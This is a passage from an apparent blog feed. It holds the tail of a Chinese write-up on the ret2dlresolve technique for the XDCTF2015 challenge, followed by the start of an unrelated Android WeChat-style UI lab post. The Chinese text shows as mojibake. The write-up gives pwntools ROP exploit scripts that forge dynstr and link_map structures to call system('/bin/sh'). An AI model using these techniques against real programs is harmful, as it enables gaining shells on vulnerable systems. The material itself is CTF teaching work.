ELF(<span class="hljs-string">'./'</span>)  <br>read_plt = elf.plt[<span class="hljs-string">'read'</span>]  <br><span class="hljs-comment">#æˆ‘ä»¬æ”»å‡»çš„ç›®æ ‡ï¼Œ.dynamicä¸­strtabçš„åœ°å€ï¼Œæˆ‘ä»¬è¦åœ¨æ­¤å¤„ä¿®æ”¹æŒ‡å‘fake_dynstr  </span><br>target_addr = <span class="hljs-number">0x600988</span> + <span class="hljs-number">8</span>  <br><span class="hljs-comment">#ç”¨äºåŠ è½½å‡½æ•°åœ°å€çš„å‡½æ•°ï¼Œå½“æˆ‘ä»¬ä¼ªé€ äº†dynstråï¼Œå†æ¬¡è°ƒç”¨å³å¯åŠ è½½æˆ‘ä»¬éœ€è¦çš„å‡½æ•°  </span><br><span class="hljs-comment">#pltèµ·å§‹åœ°å€</span><br>plt0_load =    <br><span class="hljs-comment">#pop rdi;ret;  </span><br>pop_rdi =  <br><span class="hljs-comment">#pop rsi ; pop r15 ; ret  </span><br>pop_rsi = <br><span class="hljs-comment">#ä¼ªé€ dynstr  </span><br>fake_dynstr = <span class="hljs-string">'\x00libc.so.6\x00stdin\x00system\x00'</span> <span class="hljs-comment">#åŸæœ¬dynsträ¸º\x00libc.so.6\x00stdin\x00strlen\x00'</span><br><span class="hljs-comment">#bssæ®µèµ·å§‹åœ°å€</span><br>bss =   <br>offset = <br>payload = flat(<span class="hljs-string">'a'</span> * offset , pop_rdi , <span class="hljs-number">0</span> , pop_rsi , bss , <span class="hljs-number">0</span> , read_plt , <span class="hljs-comment"># å°†'/bin/sh'ä»¥åŠä¼ªé€ çš„strtabå†™å…¥bssæ®µ</span><br>                pop_rdi , <span class="hljs-number">0</span> , pop_rsi , target_addr , <span class="hljs-number">0</span> , read_plt , <span class="hljs-comment"># å°†.dynamicä¸­çš„strtabåœ°å€æ”¹ä¸ºæˆ‘ä»¬ä¼ªé€ çš„strtabçš„åœ°å€</span><br>                pop_rdi , bss , plt0_load , <span class="hljs-number">1</span> <span class="hljs-comment"># è°ƒç”¨.dl_fixup,è§£æstrlenå‡½æ•°ï¼Œç”±äºæˆ‘ä»¬å·²ç»åœ¨fake_strtabä¸­å°†strlenæ›¿æ¢æˆsystemï¼Œæ‰€ä»¥å°†ä¼šè§£æsystemå‡½æ•°</span><br><br>)<br><br>r.recvuntil(<span class="hljs-string">'Welcome to XDCTF2015~!\n'</span>)<br>r.sendline(payload)  <br><span class="hljs-comment">#å‘é€systemçš„å‚æ•°ä»¥åŠä¼ªé€ çš„strtab</span><br>payload2 = <span class="hljs-string">'/bin/sh'</span>.ljust(<span class="hljs-number">0x10</span>,<span class="hljs-string">'\x00'</span>) + fake_dynstr  <br>sleep(<span class="hljs-number">1</span>)  <br>r.sendline(payload2)  <br>sleep(<span class="hljs-number">1</span>)  <br><span class="hljs-comment">#ä¿®æ”¹dynsymé‡Œçš„strtabçš„åœ°å€ä¸ºæˆ‘ä»¬ä¼ªé€ çš„dynstrçš„åœ°å€  </span><br>r.sendline(p64(bss + <span class="hljs-number">0x10</span>))  <br>r.interactive()  <br><br></code></pre></td></tr></tbody></table></figure><h3 id="PARTIAL-RELRO"><a href="#PARTIAL-RELRO" class="headerlink" title="PARTIAL_RELRO"></a>PARTIAL_RELRO</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *  <br>context(os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,log_level=<span class="hljs-string">'debug'</span>)<br><br><span class="hljs-comment">#r = gdb.debug("./parelro_x64",'break main')</span><br>r = process(<span class="hljs-string">'./'</span>)  <br>elf = ELF(<span class="hljs-string">'./'</span>)  <br>libc = ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc-2.31.so'</span>)  <br>read_plt = elf.plt[<span class="hljs-string">'read'</span>]  <br>write_got = elf.got[<span class="hljs-string">'write'</span>]  <br>vuln_addr = elf.sym[<span class="hljs-string">'vuln'</span>]  <br>  <br><span class="hljs-comment">#bss  </span><br>bss =   <br>bss_stage = bss + <span class="hljs-number">0x100</span><br>l_addr =  libc.sym[<span class="hljs-string">'system'</span>] -libc.sym[<span class="hljs-string">'write'</span>]  <span class="hljs-comment"># l_addr = -769472, é€šå¸¸ä¸ºè´Ÿæ•°</span><br>  <br>pop_rdi =   <br><span class="hljs-comment">#pop rsi ; pop r15 ; ret  </span><br>pop_rsi =   <br><span class="hljs-comment">#ç”¨äºè§£æç¬¦å·dl_runtime_resolve  </span><br>plt0 = <br>plt_load = plt0 + <span class="hljs-number">6</span>  <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fake_Linkmap_payload</span>(<span class="hljs-params">fake_linkmap_addr,known_func_ptr,offset</span>):<br>    <span class="hljs-comment"># &amp;(2**64-1)æ˜¯å› ä¸ºoffsetä¸ºè´Ÿæ•°ï¼Œå¦‚æœä¸æ§åˆ¶èŒƒå›´ï¼Œp64åä¼šè¶Šç•Œï¼Œå‘ç”Ÿé”™è¯¯</span><br>    linkmap = p64(offset &amp; (<span class="hljs-number">2</span> ** <span class="hljs-number">64</span> - <span class="hljs-number">1</span>))<span class="hljs-comment">#l_addr</span><br><br>    <span class="hljs-comment"># fake_linkmap_addr + 8ï¼Œä¹Ÿå°±æ˜¯DT_JMPRELï¼Œè‡³äºä¸ºä»€ä¹ˆæœ‰ä¸ª0ï¼Œå¯ä»¥å‚è€ƒIDAä¸Š.dyamiscçš„ç»“æ„å†…å®¹</span><br>    linkmap += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># å¯ä»¥ä¸ºä»»æ„å€¼</span><br>    linkmap += p64(fake_linkmap_addr + <span class="hljs-number">0x18</span>) <span class="hljs-comment"># è¿™é‡Œçš„å€¼å°±æ˜¯ä¼ªé€ çš„.rel.pltçš„åœ°å€</span><br><br>    <span class="hljs-comment"># fake_linkmap_addr + 0x18,fake_rel_write,å› ä¸ºwriteå‡½æ•°pushçš„ç´¢å¼•æ˜¯0ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€é¡¹</span><br>    linkmap += p64((fake_linkmap_addr + <span class="hljs-number">0x30</span> - offset) &amp; (<span class="hljs-number">2</span> ** <span class="hljs-number">64</span> - <span class="hljs-number">1</span>)) <span class="hljs-comment"># Rela-&gt;r_offset,æ­£å¸¸æƒ…å†µä¸‹è¿™é‡Œåº”è¯¥å­˜çš„æ˜¯gotè¡¨å¯¹åº”æ¡ç›®çš„åœ°å€ï¼Œè§£æå®Œæˆååœ¨è¿™ä¸ªåœ°å€ä¸Šå­˜æ”¾å‡½æ•°çš„å®é™…åœ°å€ï¼Œæ­¤å¤„æˆ‘ä»¬åªéœ€è¦è®¾ç½®ä¸€ä¸ªå¯è¯»å†™çš„åœ°å€å³å¯ </span><br>    linkmap += p64(<span class="hljs-number">0x7</span>) <span class="hljs-comment"># Rela-&gt;r_info,ç”¨äºç´¢å¼•symtabä¸Šçš„å¯¹åº”é¡¹ï¼Œ7&gt;&gt;32=0ï¼Œä¹Ÿå°±æ˜¯æŒ‡å‘symtabçš„ç¬¬ä¸€é¡¹</span><br>    linkmap += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># Rela-&gt;r_addend,ä»»æ„å€¼éƒ½è¡Œ</span><br><br>    linkmap += p64(<span class="hljs-number">0</span>)<span class="hljs-comment">#l_ns</span><br><br>    <span class="hljs-comment"># fake_linkmap_addr + 0x38, DT_SYMTAB </span><br>    linkmap += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># å‚è€ƒIDAä¸Š.dyamiscçš„ç»“æ„</span><br>    linkmap += p64(known_func_ptr - <span class="hljs-number">0x8</span>) <span class="hljs-comment"># è¿™é‡Œçš„å€¼å°±æ˜¯ä¼ªé€ çš„symtabçš„åœ°å€,ä¸ºå·²è§£æå‡½æ•°çš„gotè¡¨åœ°å€-0x8</span><br><br>    linkmap += <span class="hljs-string">b'/bin/sh\x00'</span><br>    linkmap = linkmap.ljust(<span class="hljs-number">0x68</span>,<span class="hljs-string">b'A'</span>)<br>    linkmap += p64(fake_linkmap_addr) <span class="hljs-comment"># fake_linkmap_addr + 0x68, å¯¹åº”çš„å€¼çš„æ˜¯DT_STRTABçš„åœ°å€ï¼Œç”±äºæˆ‘ä»¬ç”¨ä¸åˆ°strtabï¼Œæ‰€ä»¥éšæ„è®¾ç½®äº†ä¸€ä¸ªå¯è¯»åŒºåŸŸ</span><br>    linkmap += p64(fake_linkmap_addr + <span class="hljs-number">0x38</span>) <span class="hljs-comment"># fake_linkmap_addr + 0x70 , å¯¹åº”çš„å€¼æ˜¯DT_SYMTABçš„åœ°å€</span><br>    linkmap = linkmap.ljust(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b'A'</span>)<br>    linkmap += p64(fake_linkmap_addr + <span class="hljs-number">0x8</span>) <span class="hljs-comment"># fake_linkmap_addr + 0xf8, å¯¹åº”çš„å€¼æ˜¯DT_JMPRELçš„åœ°å€</span><br>    <span class="hljs-keyword">return</span> linkmap<br><br>fake_link_map = fake_Linkmap_payload(bss_stage, write_got ,l_addr)<span class="hljs-comment"># ä¼ªé€ link_map</span><br><br>payload = flat( <span class="hljs-string">'a'</span> * <span class="hljs-number">120</span> ,pop_rdi, <span class="hljs-number">0</span> , pop_rsi , bss_stage , <span class="hljs-number">0</span> , read_plt , <span class="hljs-comment"># æŠŠlink_mapå†™åˆ°bssæ®µä¸Š</span><br>                pop_rsi , <span class="hljs-number">0</span> ,<span class="hljs-number">0</span> , <span class="hljs-comment"># ä½¿æ ˆåå…­å­—èŠ‚å¯¹é½ï¼Œä¸ç„¶è°ƒç”¨ä¸äº†system</span><br>                pop_rdi , bss_stage + <span class="hljs-number">0x48</span>  , plt_load , bss_stage , <span class="hljs-number">0</span> <span class="hljs-comment"># æŠŠ/bin/shä¼ è¿›rdiï¼Œå¹¶ä¸”è°ƒç”¨_dl_rutnime_resolveå‡½æ•°ï¼Œä¼ å…¥ä¼ªé€ å¥½çš„link_mapå’Œç´¢å¼•</span><br>)<br><br>r.recvuntil(<span class="hljs-string">'Welcome to XDCTF2015~!\n'</span>)  <br>r.sendline(payload)  <br><br>r.send(fake_link_map) <br><br>r.interactive() <br><br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h1&gt;&lt;p&gt;å€Ÿé‰´æ–‡æ¡£ï¼š&lt;a href=&quot;https://blog.csdn.net/qq_51868336/article/details/114644569?acce</summary>
      
    
    
    
    <category term="pwn è¿›é˜¶" scheme="https://kylinxin.github.io/categories/pwn-%E8%BF%9B%E9%98%B6/"/>
    
    
    <category term="ret2dlresolve" scheme="https://kylinxin.github.io/tags/ret2dlresolve/"/>
    
  </entry>
  
  <entry>
    <title>ç§»åŠ¨å¼€å‘å®éªŒ1ï¼šç±»å¾®ä¿¡ç•Œé¢</title>
    <link href="https://kylinxin.github.io/2023/10/13/%E7%A7%BB%E5%8A%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E7%B1%BB%E5%BE%AE%E4%BF%A1%E7%95%8C%E9%9D%A2/"/>
    <id>https://kylinxin.github.io/2023/10/13/%E7%A7%BB%E5%8A%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E7%B1%BB%E5%BE%AE%E4%BF%A1%E7%95%8C%E9%9D%A2/</id>
    <published>2023-10-13T15:14:29.000Z</published>
    <updated>2023-10-13T02:03:10.838Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ASç±»å¾®ä¿¡ç•Œé¢å¼€å‘"><a href="#ASç±»å¾®ä¿¡ç•Œé¢å¼€å‘" class="headerlink" title="ASç±»å¾®ä¿¡ç•Œé¢å¼€å‘"></a>ASç±»å¾®ä¿¡ç•Œé¢å¼€å‘</h1><h2 id="åŠŸèƒ½è¦æ±‚"><a href="#åŠŸèƒ½è¦æ±‚" class="headerlink" title="åŠŸèƒ½è¦æ±‚"></a>åŠŸèƒ½è¦æ±‚</h2><p>1.ã€è¯·æ ¹æ®è¯¾ç¨‹å†…å®¹è®¾è®¡ä¸€ä¸ªappçš„é—¨æˆ·æ¡†æ¶ï¼Œéœ€è¦å®ç°3-4ä¸ªtabåˆ‡æ¢æ•ˆæœï¼›æœ¬åŠŸèƒ½è¦æ±‚éœ€è¦çš„æŠ€æœ¯ä¸ºï¼šactivityã€xmlã€fragment</p><p>2ã€åœ¨ä»»ä¸€tabé¡µä¸­å®ç°åˆ—è¡¨æ•ˆæœï¼›æœ¬åŠŸèƒ½çš„å®ç°éœ€è¦ä½¿ç”¨ recycleviewï¼›</p><h2 id="å¼€å‘æŠ€æœ¯"><a href="#å¼€å‘æŠ€æœ¯" class="headerlink" title="å¼€å‘æŠ€æœ¯"></a>å¼€å‘æŠ€æœ¯</h2><p>å¼€å‘å·¥å…·ï¼šas </p><p>ç‰ˆæœ¬ï¼šAPI 24 Android 7.0</p><h2 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h2><p>ç±»å¾®ä¿¡ç•Œé¢ä¸»è¦åˆ†ä¸ºä¸Šä¸­ä¸‹ä¸‰ä¸ªéƒ¨åˆ†ï¼Œå…¶ä¸­ä¸Šä¸‹ä¸º top.xmlå’Œ bottom.xml ä¸ºåŸºç¡€ä¿¡æ¯æ˜¾ç¤ºã€‚</p><p>ä¸»ç•Œé¢ä¸­é—´éƒ¨åˆ†ç”±4ä¸ªé¡µé¢å åŠ ï¼Œåœ¨è¿›è¡Œé€‰æ‹©å†…å®¹æ—¶å˜æ¢ç•Œé¢</p><p>å…¶ä¸­æˆ‘é€‰æ‹©åœ¨èŠå¤©ç•Œé¢å®ç°åˆ—è¡¨æ•ˆæœï¼Œé‡‡ç”¨ recycleview</p><h2 id="è®¾è®¡è¿‡ç¨‹"><a href="#è®¾è®¡è¿‡ç¨‹" class="headerlink" title="è®¾è®¡è¿‡ç¨‹"></a>è®¾è®¡è¿‡ç¨‹</h2><h3 id="1-å¯¼å…¥æ‰€éœ€å›¾ç‰‡åˆ°drawableç›®å½•ä¸‹"><a href="#1-å¯¼å…¥æ‰€éœ€å›¾ç‰‡åˆ°drawableç›®å½•ä¸‹" class="headerlink" title="1. å¯¼å…¥æ‰€éœ€å›¾ç‰‡åˆ°drawableç›®å½•ä¸‹"></a>1. å¯¼å…¥æ‰€éœ€å›¾ç‰‡åˆ°drawableç›®å½•ä¸‹</h3><p class='item-img' data-src='https://s2.loli.net/2023/10/07/LjBczXaqGKstNWU.png'><img src="https://s2.loli.net/2023/10/07/LjBczXaqGKstNWU.png" alt="image.png"></p><h3 id="2-å¸ƒå±€è®¾è®¡-xmlæ–‡ä»¶ç¼–å†™"><a href="#2-å¸ƒå±€è®¾è®¡-xmlæ–‡ä»¶ç¼–å†™" class="headerlink" title="2. å¸ƒå±€è®¾è®¡ xmlæ–‡ä»¶ç¼–å†™"></a>2. å¸ƒå±€è®¾è®¡ xmlæ–‡ä»¶ç¼–å†™</h3><h4 id="æ ‡é¢˜æ top-xml"><a href="#æ ‡é¢˜æ top-xml" class="headerlink" title="æ ‡é¢˜æ top.xml"></a>æ ‡é¢˜æ top.xml</h4><p><strong>å›¾ç‰‡</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/10/07/4eP9i3LUb8Wpnlj.png'><img src="https://s2.loli.net/2023/10/07/4eP9i3LUb8Wpnlj.png" alt="image.png"></p><p><strong>ä»£ç </strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"50dp"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"vertical"</span>&gt;</span><br><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/textView"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center_horizontal"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"å¾®ä¿¡"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textColor</span>=<span class="hljs-string">"@color/white"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"40sp"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">TextView</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><h4 id="åº•éƒ¨é€‰æ‹©æ bottom-xml"><a href="#åº•éƒ¨é€‰æ‹©æ bottom-xml" class="headerlink" title="åº•éƒ¨é€‰æ‹©æ bottom.xml"></a>åº•éƒ¨é€‰æ‹©æ bottom.xml</h4><p><strong>å›¾ç‰‡</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/10/07/bWVDtUKMs6ayRq7.png'><img src="https://s2.loli.net/2023/10/07/bWVDtUKMs6ayRq7.png" alt="image.png"></p><p><strong>ä»£ç </strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">"http://schemas.android.com/tools"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:baselineAligned</span>=<span class="hljs-string">"false"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"horizontal"</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- å¾®ä¿¡--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_wx"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"vertical"</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ImageView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_wx_img"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"50dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:src</span>=<span class="hljs-string">"@drawable/wx"</span>/&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_wx_txt"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"126dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:text</span>=<span class="hljs-string">"èŠå¤©"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textColor</span>=<span class="hljs-string">"@color/white"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"30sp"</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_friend"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"bottom"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"vertical"</span>&gt;</span><br><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ImageView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_friend_img"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"50dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:src</span>=<span class="hljs-string">"@drawable/txl"</span> /&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_friend_txt"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"126dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textColor</span>=<span class="hljs-string">"@color/white"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"30sp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:text</span>=<span class="hljs-string">"é€šè®¯"</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_address"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"bottom"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"vertical"</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ImageView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_address_img"</span></span><br><span class="hljs-tag">            <span 